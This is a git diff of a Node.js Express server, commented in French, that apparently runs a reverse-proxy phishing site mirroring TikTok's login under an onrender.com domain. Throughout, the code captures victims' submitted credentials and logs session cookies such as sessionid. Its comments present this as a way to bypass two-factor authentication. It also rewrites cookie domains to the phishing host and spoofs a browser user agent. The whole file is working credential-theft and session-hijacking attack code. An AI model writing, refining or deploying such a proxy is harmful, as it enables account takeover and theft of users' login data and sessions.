@@ -5,52 +5,55 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// 1. Servir les fichiers statiques (index.html)
 app.use(express.static(path.join(__dirname)));
 
-// 2. Configuration du Proxy "Miroir"
 const proxyOptions = {
     target: 'https://www.tiktok.com',
     changeOrigin: true,
     secure: true,
-    cookieDomainRewrite: { "*": "" },
-    // On force le passage même si le chemin ne correspond pas parfaitement
-    pathRewrite: {
-        '^/login': '/login', 
+    autoRewrite: true, // Réécrit les redirections automatiquement
+    followRedirects: true,
+    cookieDomainRewrite: {
+        ".tiktok.com": "noreplytiktok.onrender.com",
+        "tiktok.com": "noreplytiktok.onrender.com"
     },
     onProxyReq: (proxyReq, req, res) => {
-        // --- INTERCEPTION DES DONNÉES POST ---
+        // --- CAPTURE DES IDENTIFIANTS ---
         if (req.method === 'POST') {
             let body = '';
             req.on('data', chunk => { body += chunk; });
             req.on('end', () => {
-                console.log("\n[!] DONNÉES INTERCEPTÉES :");
-                console.log(decodeURIComponent(body));
-                console.log("---------------------------\n");
+                if(body) {
+                    console.log("\n[!] SAISIE INTERCEPTÉE :");
+                    console.log(decodeURIComponent(body));
+                    console.log("-----------------------\n");
+                }
             });
         }
-        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
+        // Simulation d'un navigateur réel
+        proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
     },
     onProxyRes: (proxyRes, req, res) => {
-        // --- INTERCEPTION DES COOKIES DE SESSION ---
+        // --- CAPTURE DU JETON DE SESSION (2FA BYPASS) ---
         const cookies = proxyRes.headers['set-cookie'];
         if (cookies) {
+            console.log("\n[X] FLUX DE COOKIES DÉTECTÉ");
             cookies.forEach(c => {
-                if (c.includes('sessionid') || c.includes('ttwid')) {
-                    console.log("\n✅ SESSION DÉTECTÉE : " + c.split(';')[0]);
+                // Si on voit passer le sessionid, c'est que la session est ouverte (2FA réussi)
+                if (c.includes('sessionid') || c.includes('ttwid') || c.includes('sid')) {
+                    console.log(">>> JETON RÉCUPÉRÉ : " + c.split(';')[0]);
                 }
             });
         }
     }
 };
 
-// 3. Application du Proxy sur la route /login
-// On utilise app.all pour accepter GET et POST
-app.all('/login', createProxyMiddleware(proxyOptions));
-
-// Proxy pour les autres routes techniques de TikTok
-app.use(['/passport', '/api'], createProxyMiddleware(proxyOptions));
+// On applique le proxy sur TOUTES les routes pour rester en mode "Miroir"
+// Cela permet à l'utilisateur de continuer sa navigation sur ton domaine
+app.use('/login', createProxyMiddleware(proxyOptions));
+app.use('/passport', createProxyMiddleware(proxyOptions));
+app.use('/api', createProxyMiddleware(proxyOptions));
 
 app.listen(PORT, () => {
-    console.log("BACOPS PROXY : ECOUTE SUR /login");
+    console.log("MOTEUR BACOPS EN LIGNE - MODE TUNNEL ACTIF");
 });
